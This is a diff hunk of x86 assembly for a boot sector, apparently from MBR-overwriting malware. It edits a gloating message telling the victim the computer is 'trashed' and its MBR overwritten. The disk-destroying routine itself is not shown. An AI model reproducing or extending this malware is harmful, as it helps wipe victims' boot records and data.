@@ -41,6 +41,6 @@ clear_screen:
         int 0x10
         ret
 
-msg:            db        "FATAL: YOUR COMPUTER IS NOW TRASHED. IT WILL BE VERY HARD TO RESTORE. HAHAHAHAHA!!",13,10,13,10,"INFO: Someone1611 is the person who trashed your pc",13,10,13,10,"What happened to my device?",13,10,"Your disk's MBR Primary has been overwritten.", 0
+msg:            db        "FATAL: YOUR COMPUTER IS NOW TRASHED. IT WILL BE VERY HARD TO RESTORE. HAHAHAHAHA!!",13,10,13,10,"INFO: Someone1611 is the person who trashed your pc",13,10,13,10,"What happened to my device?",13,10,"Your disk\'s MBR Primary has been overwritten.", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
